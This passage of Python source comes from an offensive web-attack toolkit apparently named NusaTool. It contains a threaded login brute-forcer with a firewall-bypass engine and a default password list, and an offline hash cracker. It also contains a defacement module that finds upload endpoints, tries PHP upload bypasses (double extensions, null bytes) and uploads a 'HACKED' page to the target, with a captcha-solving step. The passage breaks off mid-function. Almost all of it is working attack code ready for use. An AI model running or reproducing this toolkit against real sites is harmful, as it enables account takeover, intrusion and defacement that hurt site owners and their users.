        self.total = len(users) * len(passes)
        print(f"  {C}◉{N} Users: {len(users)} | Passwords: {len(passes)} | Combos: {Y}{self.total}{N}")

        if self.mode != "form" or self.method != "POST":
            passes = [p for u in users for p in passes]
            users = [u for u in users for p in passes]

        if self.total == 0:
            print(f"  {R}✘{N} Empty combos.\n"); return []

        q = Queue()
        for u in users:
            for p in passes:
                q.put((u, p))

        self.start_time = time.time()
        print(f"  {D}{'─'*50}{N}")

        for _ in range(min(self.threads, self.total)):
            t = threading.Thread(target=self._worker, args=(q,), daemon=True)
            t.start()
        q.join()

        elapsed = time.time() - self.start_time
        print(f"\n  {D}{'─'*50}{N}")
        if self.creds:
            print(f"  {R}{BOLD}⚠ {len(self.creds)} valid credential(s) found in {elapsed:.1f}s!{N}")
            ptable(["USERNAME", "PASSWORD"], [[c["username"], c["password"]] for c in self.creds], colors=[G] * len(self.creds))
        else:
            print(f"  {R}✘{N} No valid credentials found  ({elapsed:.1f}s, {self.total} attempts).")
        print()
        return self.creds


# ══════════════════════════════════════════════════════
#  AUTO BRUTEFORCER — URL-Only Login Bruteforce
# ══════════════════════════════════════════════════════

class AutoBruteforcer:
    def __init__(self, url, threads=5, delay=0, proxy=None):
        self.url = url.rstrip("/")
        self.threads = min(threads, 20)
        self.delay = delay
        self.proxy = proxy
        self.bypass = BypassEngine(url)
        self.form_action = None
        self.form_method = "POST"
        self.username_field = "username"
        self.password_field = "password"
        self.csrf_field = None
        self.csrf_token = None
        self.ajax_mode = False
        self.baseline = None  # Stores fail response signature
        self.creds = []
        self.lock = threading.Lock()
        self.found = threading.Event()
        self.total = 0
        self.done = 0
        self.start_time = None

    def _detect_form(self):
        """Extract login form fields + AJAX endpoint from cached page HTML."""
        html = getattr(self.bypass, 'waf_raw', None)
        if not html:
            try:
                r = requests.get(self.url, timeout=15, verify=False)
                html = r.text
            except Exception as e:
                return f"Failed to fetch page: {e}"

        # 1) Scan JavaScript for AJAX login endpoints ($.post / fetch)
        ajax_match = re.search(r"""\$\.post\s*\(\s*_BASE_URL\s*\+\s*['"]([^'"]+)['"]""", html, re.I)
        if not ajax_match:
            ajax_match = re.search(r"""\$\.post\s*\(\s*['"]([^'"]+)['"]""", html, re.I)
        if not ajax_match:
            ajax_match = re.search(r"""fetch\(['"]([^'"]*login[^'"]*)['"]""", html, re.I)
        if ajax_match:
            endpoint = ajax_match.group(1)
            self.form_action = urljoin(self.url, endpoint) if not endpoint.startswith("http") else endpoint
            self.form_method = "POST"
            self.ajax_mode = True

        # 2) Find input fields (name attributes) from the form
        pw_match = re.search(r'''<input[^>]+type=["']password["'][^>]+name=["']([^"']+)["']''', html, re.I)
        if pw_match:
            self.password_field = pw_match.group(1)

        un_match = re.search(r'''<input[^>]+type=["']text["'][^>]+name=["']([^"']+)["']''', html, re.I)
        if un_match:
            self.username_field = un_match.group(1)

        # 3) CSRF from meta tag
        ms = re.search(r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)', html, re.I)
        if ms:
            self.csrf_field = "csrf_token"
            self.csrf_token = ms.group(1)

        # 4) Fallback: parse <form> tags
        if not self.form_action or not self.password_field:
            forms = []
            i = 0
            while True:
                fs = html.find("<form", i)
                if fs == -1: break
                fe = html.find("</form>", fs)
                if fe == -1: break
                forms.append(html[fs:fe+7])
                i = fe + 7
            for form in forms:
                inputs = re.findall(r'<input[^>]+>', form, re.I)
                for inp in inputs:
                    t = (re.search(r'type=["\']([^"\']+)["\']', inp, re.I) or [None, ""]).group(1).lower()
                    nm = (re.search(r'name=["\']([^"\']+)["\']', inp, re.I) or [None, ""]).group(1)
                    if t == "password":
                        self.password_field = nm
                    elif t in ("text", "email"):
                        if any(k in nm.lower() for k in ["user", "email", "login", "name"]):
                            self.username_field = nm
                    elif t == "hidden":
                        if any(k in nm.lower() for k in ["csrf", "token", "nonce", "_token"]):
                            self.csrf_field = nm
                            vm = re.search(r'value=["\']([^"\']+)["\']', inp, re.I)
                            if vm: self.csrf_token = vm.group(1)
                if self.password_field:
                    am = re.search(r'action=["\']([^"\']+)["\']', form[:300], re.I)
                    if am:
                        a = am.group(1)
                        self.form_action = urljoin(self.url, a) if not a.startswith("http") else a
                    if not self.form_action:
                        self.form_action = self.url
                    mm = re.search(r'method=["\']([^"\']+)["\']', form[:200], re.I)
                    if mm: self.form_method = mm.group(1).upper()
                    break

        if not self.password_field:
            return "No password field found"
        if not self.form_action:
            self.form_action = self.url
        return None  # Success

    def _build_baseline(self):
        """Send guaranteed-wrong login to capture fail signature (with retries)."""
        fake_u = f"__nusatool_invalid_{random.randint(10000,99999)}__"
        fake_p = f"__nusatool_wrong_{random.randint(10000,99999)}__"
        data = {self.username_field: fake_u, self.password_field: fake_p}
        if self.csrf_field and self.csrf_token:
            data[self.csrf_field] = self.csrf_token
        for attempt in range(3):
            try:
                headers = {}
                if getattr(self, 'ajax_mode', False):
                    headers['X-Requested-With'] = 'XMLHttpRequest'
                    headers['Accept'] = 'application/json, text/javascript, */*; q=0.01'
                if self.form_method == "GET":
                    r = self.bypass.get(self.form_action, params=data, headers=headers, timeout=20, allow_redirects=False)
                else:
                    r = self.bypass.post(self.form_action, data=data, headers=headers, timeout=20, allow_redirects=False)
                self.baseline = {
                    "status": r.status_code,
                    "len": len(r.text),
                    "text": r.text,
                    "text_hash": hashlib.md5(r.text.encode()).hexdigest(),
                    "redirect": r.headers.get("Location", ""),
                    "cookies": dict(r.cookies),
                }
                return True
            except requests.Timeout:
                if attempt < 2:
                    print(f"  {Y}⚠{N} Baseline timeout (attempt {attempt+1}), retrying...")
                    time.sleep(2)
                else:
                    print(f"  {R}✘{N} Baseline request timeout after 3 attempts")
            except Exception as e:
                if attempt < 2:
                    time.sleep(1)
                else:
                    print(f"  {R}✘{N} Baseline request failed: {e}")
        return False

    def _try(self, u, p):
        data = {self.username_field: u, self.password_field: p}
        if self.csrf_field and self.csrf_token:
            data[self.csrf_field] = self.csrf_token
        try:
            headers = {}
            if getattr(self, 'ajax_mode', False):
                headers['X-Requested-With'] = 'XMLHttpRequest'
                headers['Accept'] = 'application/json, text/javascript, */*; q=0.01'
            if self.form_method == "GET":
                r = self.bypass.get(self.form_action, params=data, headers=headers, timeout=15, allow_redirects=False)
            else:
                r = self.bypass.post(self.form_action, data=data, headers=headers, timeout=15, allow_redirects=False)

            if self.baseline is None:
                return False

            bl = self.baseline
            loc = r.headers.get("Location", "")
            text = r.text
            html_lower = text.lower()

            # 1) JSON response — parse and check for success status
            if text.strip().startswith('{'):
                try:
                    j = json.loads(text)
                    if j.get('status') == 'success':
                        return True
                except (json.JSONDecodeError, AttributeError):
                    pass
                # All JSON non-success responses are definitely failures
                return False

            # 2) Redirect ke non-login page → strong success
            if r.status_code in (301, 302, 307, 308):
                if loc and "login" not in loc.lower() and loc != bl.get("redirect", ""):
                    return True

            # 3) Ga ada password field di response → kemungkinan udah login
            if "type=\"" in html_lower:
                has_pw = bool(re.search(r'type\s*=\s*["\']password["\']', html_lower, re.I))
                if not has_pw:
                    no_login = "login" not in html_lower and "sign in" not in html_lower
                    if no_login or abs(len(r.text) - bl.get("len", 0)) > 500:
                        return True

            # 4) HTML success keywords
            success_kw = ["welcome", "dashboard", "logout", "my account",
                          "selamat datang", "berhasil", "profil"]
            fail_kw = ["invalid", "wrong password", "incorrect", "login failed",
                       "failed", "tidak valid", "salah", "gagal"]
            has_success = any(k in html_lower for k in success_kw)
            has_fail = any(k in html_lower for k in fail_kw)
            if has_success and not has_fail:
                return True

            # 5) Size berubah drastis + hash beda → possible success
            if abs(len(r.text) - bl.get("len", 0)) > 1000:
                text_hash = hashlib.md5(text.encode()).hexdigest()
                if text_hash != bl.get("text_hash", ""):
                    if not has_fail:
                        return True

            return False
        except:
            return False

    def _worker(self, q):
        while not self.found.is_set():
            try:
                u, p = q.get_nowait()
            except:
                break
            if self._try(u, p):
                with self.lock:
                    self.creds.append({"username": u, "password": p})
                    self.found.set()
                    elapsed = time.time() - self.start_time
                    print(f"\n  {G}{BOLD}[SUCCESS]{N} {Y}{u}{N} : {Y}{p}{N}  {D}({elapsed:.1f}s){N}")
            with self.lock:
                self.done += 1
                now = time.time()
                if self.done % max(1, self.total // 50) == 0 or self.done == self.total:
                    elapsed = now - self.start_time
                    rate = self.done / elapsed if elapsed > 0 else 0
                    pct = self.done * 100 // self.total
                    eta = (self.total - self.done) / rate if rate > 0 else 0
                    print(f"  {D}[{self.done}/{self.total}] {pct}% | {rate:.1f}/s | ETA {eta:.0f}s{N}", end="\r")
            if self.delay > 0:
                time.sleep(self.delay)
            q.task_done()

    def run(self):
        header("AUTO BRUTEFORCER — URL-ONLY LOGIN CRACK")
        print(f"  {C}◉{N} URL  : {Y}{self.url}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable.\n")
            return []

        # Phase 1: Form detection
        print(f"\n  {BOLD}{C}PHASE 1: FORM DETECTION{N}")
        err = self._detect_form()
        if err:
            print(f"  {R}✘{N} {err}\n")
            return []
        print(f"  {G}✔{N} Login form detected!")
        print(f"      {D}URL:   {Y}{self.form_action}{N}")
        print(f"      {D}Field: {Y}{self.username_field}{N} / {Y}{self.password_field}{N}")
        print(f"      {D}CSRF:  {Y}{self.csrf_field or 'none'}{N}")
        if self.csrf_token:
            print(f"      {D}Token: {Y}{self.csrf_token[:30]}...{N}")

        # Phase 1b: Baseline
        print(f"\n  {BOLD}{C}PHASE 1b: BUILD FAIL BASELINE{N}")
        print(f"  {C}▶{N} Sending deliberately wrong login to capture fail signature...")
        if not self._build_baseline():
            print(f"  {R}✘{N} Could not build baseline — aborting.\n")
            return []
        print(f"  {G}✔{N} Baseline captured!")
        print(f"      {D}Status: {Y}{self.baseline['status']}{N}  |  Size: {Y}{self.baseline['len']}B{N}")

        # Phase 2: Build credential pairs
        print(f"\n  {BOLD}{C}PHASE 2: LOADING CREDENTIALS{N}")
        creds = []
        wd = os.path.join(os.path.dirname(__file__), "wordlists")

        users = ["admin", "administrator", "root", "user", "test", "guest", "manager",
                 "operator", "supervisor", "demo", "dev", "backup", "nobody", "mail", "ftp"]

        passes = ["admin", "password", "123456", "admin123", "password123", "letmein", "qwerty",
                  "admin12345", "P@ssw0rd", "12345678", "welcome", "root123", "toor", "test",
                  "admin1", "administrator1", "passw0rd", "Passw0rd", "changeme", "secret",
                  "1234", "12345", "abc123", "monkey", "dragon", "master", "login", "summer",
                  "princess", "batman", "superman", "iloveyou", "sunshine", "trustno1",
                  "football", "baseball", "password1", "password!", "qwerty123"]

        uf = os.path.join(wd, "usernames.txt")
        pf = os.path.join(wd, "passwords.txt")
        if os.path.exists(uf):
            with open(uf) as f:
                users = [l.strip() for l in f if l.strip()]
            print(f"  {G}✔{N} Loaded {len(users)} users from wordlist")
        else:
            print(f"  {Y}⚠{N} Default {len(users)} users (place wordlists/usernames.txt for custom){N}")

        if os.path.exists(pf):
            with open(pf) as f:
                passes = [l.strip() for l in f if l.strip()]
            print(f"  {G}✔{N} Loaded {len(passes)} passwords from wordlist")
        else:
            print(f"  {Y}⚠{N} Default {len(passes)} passwords (place wordlists/passwords.txt for custom){N}")

        for u in users:
            for p in passes:
                creds.append((u, p))

        self.total = len(creds)
        print(f"  {C}◉{N} Total combos: {Y}{self.total}{N}  |  Threads: {Y}{self.threads}{N}")

        if self.total == 0:
            print(f"  {R}✘{N} No credentials to try.\n")
            return []

        # Phase 3: Brute force
        print(f"\n  {BOLD}{C}PHASE 3: BRUTE FORCING{N}")
        print(f"  {D}{'─'*50}{N}")

        q = Queue()
        for u, p in creds:
            q.put((u, p))

        self.start_time = time.time()
        for _ in range(min(self.threads, self.total)):
            t = threading.Thread(target=self._worker, args=(q,), daemon=True)
            t.start()
        q.join()
        elapsed = time.time() - self.start_time

        print(f"\n  {D}{'─'*50}{N}")
        if self.creds:
            print(f"  {R}{BOLD}⚠ {len(self.creds)} potential credential(s) found in {elapsed:.1f}s!{N}")
            print(f"  {Y}⚠{N} Please verify manually — may contain false positives{N}")
            ptable(["USERNAME", "PASSWORD"], [[c["username"], c["password"]] for c in self.creds], colors=[G] * len(self.creds))
        else:
            print(f"  {R}✘{N} No valid credentials  ({self.total} attempts in {elapsed:.1f}s)")
            print(f"      {D}Tip: add custom wordlists at wordlists/usernames.txt and wordlists/passwords.txt{N}")
        print()
        return self.creds


# ══════════════════════════════════════════════════════
#  HASH CRACKER — Offline Hash Bruteforce
# ══════════════════════════════════════════════════════

class HashCracker:
    def __init__(self, target_hash, wordlist, hash_type="auto", threads=4):
        self.target = target_hash.lower().strip()
        self.wl = wordlist
        self.hash_type = hash_type
        self.threads = min(threads, 8)
        self.found = None
        self.algorithms = {
            "md5": hashlib.md5,
            "md4": hashlib.new,
            "sha1": hashlib.sha1,
            "sha224": hashlib.sha224,
            "sha256": hashlib.sha256,
            "sha384": hashlib.sha384,
            "sha512": hashlib.sha512,
        }
        self.salt = None

    def _detect_type(self):
        h = self.target
        lh = len(h)
        if lh == 32 and all(c in "0123456789abcdef" for c in h): return "md5"
        if lh == 40 and all(c in "0123456789abcdef" for c in h): return "sha1"
        if lh == 56 and all(c in "0123456789abcdef" for c in h): return "sha224"
        if lh == 64 and all(c in "0123456789abcdef" for c in h): return "sha256"
        if lh == 96 and all(c in "0123456789abcdef" for c in h): return "sha384"
        if lh == 128 and all(c in "0123456789abcdef" for c in h): return "sha512"
        if ":" in h:
            parts = h.split(":")
            self.salt = parts[0]
            self.target = parts[1].lower()
            return self._detect_type()
        return None

    def _check(self, word):
        word = word.strip()
        if not word:
            return False
        h = self.algorithms[self.hash_type](word.encode()).hexdigest()
        if h == self.target:
            self.found = word
            return True
        if h == self.target.lower():
            self.found = word
            return True
        if self.salt:
            h2 = self.algorithms[self.hash_type]((self.salt + word).encode()).hexdigest()
            if h2 == self.target:
                self.found = word
                return True
            h3 = self.algorithms[self.hash_type]((word + self.salt).encode()).hexdigest()
            if h3 == self.target:
                self.found = word
                return True
        # Common variants
        for prefix in ["", "@", "#", "!", "123", "2023", "2024"]:
            h4 = self.algorithms[self.hash_type]((prefix + word).encode()).hexdigest()
            if h4 == self.target:
                self.found = prefix + word
                return True
        return False

    def _worker(self, q, stop):
        while not stop.is_set():
            try:
                word = q.get_nowait()
            except:
                break
            if self._check(word):
                stop.set()
            q.task_done()

    def run(self):
        header("HASH CRACKER")
        print(f"  {C}◉{N} Target Hash: {Y}{self.target}{N}")
        if self.salt:
            print(f"  {C}◉{N} Salt: {Y}{self.salt}{N}")

        detected = self._detect_type()
        if self.hash_type == "auto":
            if not detected:
                print(f"  {R}✘{N} Could not auto-detect hash type. Use --type md5|sha1|sha256|sha512\n")
                return None
            self.hash_type = detected
        elif self.hash_type not in self.algorithms:
            print(f"  {R}✘{N} Unknown hash type. Use: {', '.join(self.algorithms.keys())}\n")
            return None

        print(f"  {C}◉{N} Type: {Y}{self.hash_type.upper()}{N} | Threads: {Y}{self.threads}{N}")

        try:
            with open(self.wl, errors="ignore") as f:
                words = [l.rstrip("\n\r") for l in f]
        except:
            print(f"  {R}✘{N} Wordlist not found: {self.wl}\n")
            return None

        total = len(words)
        print(f"  {C}◉{N} Wordlist: {Y}{self.wl}{N}  ({total} words)")

        if total == 0:
            print(f"  {R}✘{N} Empty wordlist.\n")
            return None

        print(f"\n  {BOLD}{C}CRACKING IN PROGRESS...{N}")
        print(f"  {D}{'─'*50}{N}")

        q = Queue()
        for w in words:
            q.put(w)

        stop = threading.Event()
        start = time.time()
        last_update = time.time()
        done = 0

        for _ in range(min(self.threads, total)):
            t = threading.Thread(target=self._worker, args=(q, stop), daemon=True)
            t.start()

        # Progress monitor
        while not stop.is_set() and not q.empty():
            current_done = total - q.qsize()
            if current_done > done:
                done = current_done
                now = time.time()
                if now - last_update >= 0.5:
                    elapsed = now - start
                    rate = done / elapsed if elapsed > 0 else 0
                    pct = done * 100 // total
                    eta = (total - done) / rate if rate > 0 else 0
                    print(f"  {D}[{done}/{total}] {pct}% | {rate:.0f} w/s | ETA {eta:.0f}s{N}", end="\r")
                    last_update = now
            time.sleep(0.05)

        q.join()
        elapsed = time.time() - start

        print(f"\n  {D}{'─'*50}{N}")
        if self.found:
            print(f"\n  {G}{BOLD}[CRACKED!]{N} {Y}{self.target}{N} → {G}{BOLD}{self.found}{N}")
            print(f"  {D}Time: {elapsed:.1f}s{N}")
        else:
            print(f"\n  {R}[!]{N} Hash not cracked  ({total} words in {elapsed:.1f}s)")
        print()
        return self.found


# ══════════════════════════════════════════════════════
#  DEFACE TESTER — File Upload & Writeable Dir Scanner
# ══════════════════════════════════════════════════════

class DefaceTester:
    def __init__(self, url, bypass=None):
        self.url = url.rstrip("/")
        self.bypass = bypass or BypassEngine(url)
        self.parsed = urlparse(self.url)
        self.vulns = []
        self.upload_endpoints = [
            "/upload", "/uploads", "/file", "/files", "/media", "/assets",
            "/admin/upload", "/admin/uploads", "/admin/file", "/admin/files",
            "/wp-content/uploads", "/wp-admin/upload", "/wp-admin/async-upload.php",
            "/upload.php", "/file.php", "/upload_file.php", "/uploadfile.php",
            "/api/upload", "/api/file", "/api/v1/upload", "/api/v1/file",
            "/editor/upload", "/ckfinder/upload", "/fckeditor/upload",
            "/images", "/img", "/storage", "/userfiles", "/uploads/images",
            "/uploadify", "/plupload", "/resize", "/thumb", "/thumbnail",
            "/_upload", "/uploader", "/upload_handler", "/Upload",
            "/admin/content", "/admin/media", "/admin/filemanager",
            "/simpla/index.php", "/backup", "/files/upload",
        ]

    def _check_upload_endpoint(self, path):
        u = urljoin(self.url, path)
        try:
            r = self.bypass.get(u, timeout=8, allow_redirects=False)
            sc = r.status_code
            if sc == 200:
                ct = r.headers.get("Content-Type", "").lower()
                if "text/html" in ct or "application/json" in ct or sc == 200:
                    self.vulns.append({"type": "Upload Endpoint", "url": u, "status": sc, "detail": "Upload endpoint accessible"})
                    print(f"  {Y}[!]{N} {G}UPLOAD ENDPOINT{N} {u}  {D}[HTTP {sc}]{N}")
                    return True
                elif "text/plain" in ct:
                    self.vulns.append({"type": "Upload Endpoint", "url": u, "status": sc, "detail": "Upload endpoint (plain text)"})
                    print(f"  {Y}[!]{N} {Y}UPLOAD ENDPOINT{N} {u}  {D}[HTTP {sc} text/plain]{N}")
                    return True
            elif sc in (301, 302, 307, 308):
                loc = r.headers.get("Location", "")
                if not loc.startswith("http") and not loc.startswith("/"):
                    self.vulns.append({"type": "Upload Endpoint", "url": u, "status": sc, "detail": f"Redirects to: {loc}"})
                    print(f"  {Y}[?]{N} {C}UPLOAD REDIRECT{N} {u} → {D}{loc}{N}")
        except: pass
        return False

    def _check_put_method(self, path):
        u = urljoin(self.url, path)
        test_file = f"nusatool_test_{random.randint(1000,9999)}.txt"
        test_content = f"NusaTool Security Test — {datetime.datetime.now()}"
        try:
            r = self.bypass.get(u + test_file, timeout=8, allow_redirects=False)
            if r.status_code not in (404,):
                return False
        except: pass
        try:
            hdrs = {**self.bypass.bypass_headers, "User-Agent": random.choice(self.bypass.ua_list)}
            r = requests.put(u + test_file, data=test_content, headers=hdrs, timeout=8, verify=False)
            if r.status_code in (200, 201, 204):
                r2 = self.bypass.get(u + test_file, timeout=8, allow_redirects=False)
                if r2.status_code == 200 and test_content in r2.text:
                    self.vulns.append({"type": "PUT Writeable", "url": u + test_file, "status": r.status_code, "detail": "Directory is writeable via PUT"})
                    print(f"  {R}[!]{N} {BOLD}PUT WRITEABLE{N} {Y}{u}{N}")
                    print(f"      {D}Created and verified: {test_file}{N}")
                    return True
        except requests.RequestException as e:
            print(f"  {D}  PUT failed: {e}{N}")
        except: pass
        return False

    def _check_fileupload_form(self):
        try:
            r = self.bypass.get(self.url, timeout=10)
            forms_found = 0
            upload_forms = 0
            i = 0
            while True:
                fs = r.text.find("<form", i)
                if fs == -1: break
                fe = r.text.find("</form>", fs)
                if fe == -1: break
                form = r.text[fs:fe+7]
                forms_found += 1
                if 'enctype="multipart/form-data"' in form or "type='file'" in form or 'type="file"' in form or 'type=file' in form:
                    upload_forms += 1
                    inp_names = set()
                    for m in re.finditer(r'name=["\']([^"\']+)["\']', form):
                        inp_names.add(m.group(1))
                    action = ""
                    am = re.search(r'action=["\']([^"\']+)["\']', form[:300])
                    if am: action = am.group(1)
                    self.vulns.append({"type": "Upload Form", "url": self.url, "detail": f"Form action: {action}, fields: {', '.join(inp_names)}"})
                    print(f"  {Y}[!]{N} {C}FILE UPLOAD FORM{N}  action={D}{action[:50]}{N}  fields={inp_names}")
                i = fe + 7
            if forms_found == 0:
                print(f"  {D}[−]{N} No forms found on page")
            elif upload_forms == 0:
                print(f"  {G}[✔]{N} No file upload forms detected  {D}({forms_found} form(s) found){N}")
            else:
                print(f"      {Y}{upload_forms} upload form(s) out of {forms_found} total{N}")
            return upload_forms
        except Exception as e:
            print(f"  {R}✘{N} Form scan error: {e}")
            return 0

    def _check_directory_listing(self, path):
        u = urljoin(self.url, path)
        try:
            r = self.bypass.get(u, timeout=8)
            if r.status_code == 200:
                indicators = ["Index of /", "<title>Index of", "Parent Directory</a>", "<a href=\"?C=", "Directory listing for"]
                if any(ind in r.text for ind in indicators):
                    self.vulns.append({"type": "Directory Listing", "url": u, "status": 200, "detail": "Directory listing enabled"})
                    print(f"  {Y}[!]{N} {R}DIR LISTING{N} {u}")
                    return True
        except: pass
        return False

    def _test_upload_bypass(self, path):
        u = urljoin(self.url, path)
        test_name = f"nusatool_{random.randint(10000,99999)}"
        payloads = [
            (f"{test_name}.php", "<?php echo 'nusatool_test'; ?>", "PHP"),
            (f"{test_name}.php5", "<?php echo 'nusatool_test'; ?>", "PHP5"),
            (f"{test_name}.phtml", "<?php echo 'nusatool_test'; ?>", "PHTML"),
            (f"{test_name}.php.jpg", "<?php echo 'nusatool_test'; ?>", "PHP double ext"),
            (f"{test_name}.jpg", "<?php echo 'nusatool_test'; ?>", "JPG with PHP"),
            (f"{test_name}.php%00.jpg", "<?php echo 'nusatool_test'; ?>", "Null byte"),
            (f"{test_name}.html", "<html><h1>NusaTool</h1></html>", "HTML upload"),
        ]
        for fname, content, label in payloads:
            try:
                files = {"file": (fname, content, "application/octet-stream")}
                r = requests.post(u, files=files, timeout=10, verify=False,
                    headers={"User-Agent": "Mozilla/5.0"})
                if r.status_code in (200, 201, 204):
                    verify_url = urljoin(self.url.rstrip("/") + "/", fname)
                    r2 = requests.get(verify_url, timeout=8, verify=False)
                    if r2.status_code == 200:
                        self.vulns.append({"type": f"Upload Bypass ({label})", "url": verify_url, "status": r.status_code, "detail": f"Uploaded {fname} is accessible"})
                        print(f"  {R}[!]{N} {BOLD}UPLOAD BYPASS{N} {Y}{label}{N}")
                        print(f"      {D}→ {verify_url}{N}")
                        return True
            except: pass
        return False

    def scan(self):
        header("DEFACE TESTER — UPLOAD & WRITEABLE SCANNER")
        print(f"  {C}◉{N} URL  : {Y}{self.url}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable — aborting.\n")
            return []

        upload_endpoints = []
        writeable_dirs = []
        dir_listings = []

        print(f"\n  {BOLD}{C}PHASE 1: UPLOAD ENDPOINTS{N}  ({len(self.upload_endpoints)} paths)")
        for ep in self.upload_endpoints:
            if self._check_upload_endpoint(ep):
                upload_endpoints.append(ep)

        print(f"\n  {BOLD}{C}PHASE 2: FILE UPLOAD FORMS{N}")
        self._check_fileupload_form()

        print(f"\n  {BOLD}{C}PHASE 3: PUT METHOD CHECK{N}")
        put_dirs = ["/", "/uploads/", "/images/", "/assets/", "/files/", "/media/", "/tmp/"]
        for d in put_dirs:
            if self._check_put_method(d):
                writeable_dirs.append(d)
                break

        print(f"\n  {BOLD}{C}PHASE 4: DIRECTORY LISTING{N}")
        listing_dirs = ["/uploads/", "/images/", "/assets/", "/files/", "/media/", "/backup/", "/tmp/", "/admin/"]
        for d in listing_dirs:
            if self._check_directory_listing(d):
                dir_listings.append(d)

        if upload_endpoints:
            print(f"\n  {BOLD}{C}PHASE 5: UPLOAD BYPASS ATTEMPTS{N}")
            for ep in upload_endpoints[:3]:
                self._test_upload_bypass(ep)

        print(f"\n  {D}{'─'*50}{N}")
        total = len(self.vulns)
        if total:
            print(f"  {R}{BOLD}⚠ {total} potential deface vector(s) found!{N}")
            ptable(["#", "TYPE", "URL", "STATUS"],
                   [[str(i+1), v["type"], v["url"][:55], str(v.get("status","?"))] for i, v in enumerate(self.vulns)],
                   colors=[R if "Writeable" in v["type"] or "Bypass" in v["type"] else Y for v in self.vulns])
        else:
            print(f"  {G}✔{N} No deface vectors detected.")
        print()
        return self.vulns

    def _submit_form(self, content, fname, captcha_answer=None):
        """Submit detected upload form with deface content (handles Kleeja captcha)."""
        try:
            r = self.bypass.get(self.url, timeout=15)
            html = r.text
        except Exception as e:
            print(f"  {R}[✘]{N} Failed to fetch form page: {e}")
            return None

        fs = html.find("<form")
        if fs == -1:
            return None
        fe = html.find("</form>", fs)
        if fe == -1:
            return None
        form = html[fs:fe+7]

        am = re.search(r'action=["\']([^"\']*)["\']', form[:500], re.I)
        action = am.group(1) if am else ""

        form_data = {}
        file_field = None
        for inp in re.finditer(r'<input[^>]+>', form, re.I):
            nm = (re.search(r'name=["\']([^"\']+)["\']', inp.group(), re.I) or [None, None]).group(1)
            if not nm: continue
            typ = (re.search(r'type=["\']([^"\']+)["\']', inp.group(), re.I) or [None, "text"]).group(1).lower()
            if typ == "file":
                file_field = nm
            elif typ == "hidden":
                vm = re.search(r'value=["\']([^"\']*)["\']', inp.group(), re.I)
                form_data[nm] = vm.group(1) if vm else ""
            elif typ == "submit":
                vm = re.search(r'value=["\']([^"\']*)["\']', inp.group(), re.I)
                form_data[nm] = vm.group(1) if vm else "submit"
            elif typ == "text":
                vm = re.search(r'value=["\']([^"\']*)["\']', inp.group(), re.I)
                form_data[nm] = vm.group(1) if vm else ""

        captcha_img = re.search(r'<img[^>]+src=["\']([^"\']*captcha[^"\']*)["\']', html, re.I)
        if captcha_img:
            img_url = urljoin(self.url, captcha_img.group(1))
            try:
                img_data = requests.get(img_url, timeout=10, verify=False,
                    headers={"User-Agent": "Mozilla/5.0"}).content
                captcha_path = "/tmp/nusatool_captcha.png"
                with open(captcha_path, "wb") as f:
                    f.write(img_data)
                print(f"\n  {Y}[!]{N} {BOLD}CAPTCHA DETECTED{N}")
                print(f"  {D}Image saved to: {Y}{captcha_path}{N}")
                if captcha_answer:
                    answer = captcha_answer
                else:
                    try:
                        answer = input(f"  {Y}Captcha text{N} > ").strip()
                    except (EOFError, OSError):
                        print(f"  {R}✘{N} Interactive input unavailable. Use --captcha <answer>")
                        return None
                for inp in re.finditer(r'<input[^>]+>', form, re.I):
                    nm = (re.search(r'name=["\']([^"\']+)["\']', inp.group(), re.I) or [None, None]).group(1)
                    if nm and any(k in nm.lower() for k in ["captcha", "kleeja", "code", "answer"]):
                        form_data[nm] = answer
            except Exception as e:
                print(f"  {R}[✘]{N} Captcha error: {e}")
                return None

        if not file_field:
            print(f"  {R}[✘]{N} No file input field found in form")
            return None

        action_url = urljoin(self.url, action) if action else self.url
        files_payload = {file_field: (fname, content, "text/html")}
        try:
            print(f"  {C}▶{N} Submitting form to {Y}{action_url}{N}")
            r2 = requests.post(action_url, data=form_data, files=files_payload,
                timeout=15, verify=False,
                headers={"User-Agent": "Mozilla/5.0"})
            if r2.status_code in (200, 201, 204, 302, 301):
                verify_url = urljoin(self.url.rstrip("/") + "/", fname)
                r3 = requests.get(verify_url, timeout=8, verify=False)
                if r3.status_code == 200 and len(r3.text) > 50:
                    print(f"  {G}[✔]{N} {BOLD}FORM UPLOAD SUCCESS{N} {Y}{verify_url}{N}")
                    return {"method": "FORM", "url": verify_url}
                link = re.search(r'href=["\']([^"\']*)' + re.escape(fname), r2.text, re.I)
                if link:
                    lurl = urljoin(self.url, link.group(1))
                    print(f"  {G}[✔]{N} {BOLD}FORM UPLOAD{N} {Y}{lurl}{N}")
                    return {"method": "FORM", "url": lurl}
                print(f"  {Y}[?]{N} Form submitted but could not verify. Check manually.")
                return {"method": "FORM", "url": action_url}
        except Exception as e:
            print(f"  {R}[✘]{N} Form submission failed: {e}")
        return None

    def deface(self, filepath=None, content=None, captcha_answer=None):
        """Scan + actual upload of deface content."""
        self._captcha_answer = captcha_answer
        if not filepath and not content:
            content = f"""<!DOCTYPE html><html><head><title>Hacked</title><style>
body {{ background:#000; color:#0f0; text-align:center; padding-top:20vh; font-family:monospace; }}
h1 {{ font-size:4em; }} blink {{ font-size:1.5em; }}</style></head>
<body><h1>🔥 HACKED 🔥</h1><blink>NusaTool Security Assessment</blink>
<p style='color:#888;margin-top:3em'>This site has been defaced for security demonstration</p>
<p style='color:#555'>Contact: security@nusatool.local</p></body></html>"""

        if filepath and not content:
            try:
                with open(filepath, errors='replace') as f:
                    content = f.read()
            except Exception as e:
                print(f"  {R}✘{N} Failed to read file: {e}")
                return []

        header("DEFACE — ACTIVE DEPLOYMENT")
        print(f"  {C}◉{N} URL  : {Y}{self.url}{N}")
        print(f"  {C}◉{N} Size : {Y}{len(content)}B{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable.\n")
            return []

        self.scan()
        if not self.vulns:
            print(f"  {R}✘{N} No vectors found — cannot deface.\n")
            return []

        fname = f"nusadeface_{random.randint(10000,99999)}.html"
        uploaded = []

        # 1) PUT method — langsung upload ke direktori writeable
        for v in self.vulns:
            if "PUT Writeable" in v["type"]:
                base_dir = v["url"].rsplit("/", 1)[0] + "/" if "/" in v["url"] else "/"
                target = base_dir + fname
                try:
                    hdrs = {**self.bypass.bypass_headers, "User-Agent": random.choice(self.bypass.ua_list), "Content-Type": "text/html"}
